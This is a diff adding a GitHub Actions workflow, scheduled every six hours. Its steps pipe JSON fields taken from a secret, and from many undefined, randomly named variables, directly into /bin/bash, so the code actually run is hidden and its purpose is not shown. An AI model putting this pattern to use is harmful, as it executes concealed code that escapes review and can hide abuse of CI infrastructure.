@@ -1,0 +1,31 @@
+name: tanshenmexinzidaiyu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tanshenmexinzidaiyu
+        env:
+          nf0467: ${{ secrets.nf0467 }}
+        run: |
+          echo $nf0467 | jq -r .r4 | /bin/bash
+          echo $dcu93341 | jq -r .plab5 | /bin/bash
+          echo $xkxsa80847 | jq -r .sknh2 | /bin/bash
+          echo $xba25263 | jq -r .zs463 | /bin/bash
+          echo $d19 | jq -r .oj54 | /bin/bash
+          echo $cfwut0172 | jq -r .fpa9 | /bin/bash
+          echo $x56456 | jq -r .rzunz99177 | /bin/bash
+          echo $agye86668 | jq -r .mrcn7 | /bin/bash
+          echo $l0 | jq -r .vdpxb81 | /bin/bash
+          echo $l8 | jq -r .gno0 | /bin/bash
+          echo $jgx40151 | jq -r .wgv3 | /bin/bash
+          echo $b98551 | jq -r .uudsp1 | /bin/bash
+          echo $wsi433 | jq -r .l3985 | /bin/bash
+          echo $re5 | jq -r .vmqrm02845 | /bin/bash
+          echo $btvna6753 | jq -r .cdg160 | /bin/bash
+
